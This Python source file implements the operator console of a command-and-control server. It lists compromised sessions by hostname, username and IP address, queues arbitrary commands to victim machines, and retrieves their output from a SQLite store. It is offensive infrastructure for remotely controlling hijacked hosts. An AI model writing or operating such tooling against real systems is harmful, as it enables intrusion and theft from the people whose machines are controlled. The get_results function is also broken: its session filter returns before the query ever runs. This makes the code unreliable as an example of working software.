import sqlite3
import secrets
from datetime import datetime

class C2Operator:
    def __init__(self, db_path='c2_data/c2.db'):
        self.db_path = db_path

    def list_sessions(self, active_only=True):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        query = '''
            SELECT session_id, hostname, username, ip_address, os_type, 
                   last_seen, active
            FROM sessions
        '''
        if active_only:
            query += ' WHERE active = 1'
        query += ' ORDER BY last_seen DESC'
        cursor.execute(query)
        sessions = [{
            'session_id': row[0],
            'hostname': row[1],
            'username': row[2],
            'ip_address': row[3],
            'os_type': row[4],
            'last_seen': row[5],
            'active': bool(row[6])
        } for row in cursor.fetchall()]
        conn.close()
        return sessions

    def issue_command(self, session_id, command):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT session_id FROM sessions WHERE session_id = ?', (session_id,))
        if not cursor.fetchone():
            conn.close()
            return None
        task_id = secrets.token_hex(16)
        cursor.execute('''
            INSERT INTO tasks (task_id, session_id, command, created_at, status)
            VALUES (?, ?, ?, ?, 'pending')
        ''', (
            task_id,
            session_id,
            command,
            datetime.now().isoformat()
        ))
        conn.commit()
        conn.close()
        return task_id

    def get_results(self, task_id=None, session_id=None, limit=10):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        query = '''
            SELECT r.result_id, r.task_id, r.session_id, t.command, 
                   r.output, r.received_at
            FROM results r
            JOIN tasks t ON r.task_id = t.task_id
        '''
        params = ()
        if task_id:
            query += ' WHERE r.task_id = ?'
            params = (task_id,)
        elif session_id:
            query += ' WHERE r.session_id = ?'
            params = (session_id, limit)
            query += ' ORDER BY r.received_at DESC LIMIT ?'
            return
        else:
            query += ' ORDER BY r.received_at DESC LIMIT ?'
            params = (limit,)
        cursor.execute(query, params)
        results = [{
            'result_id': row[0],
            'task_id': row[1],
            'session_id': row[2],
            'command': row[3],
            'output': row[4],
            'received_at': row[5]
        } for row in cursor.fetchall()]
        conn.close()
        return results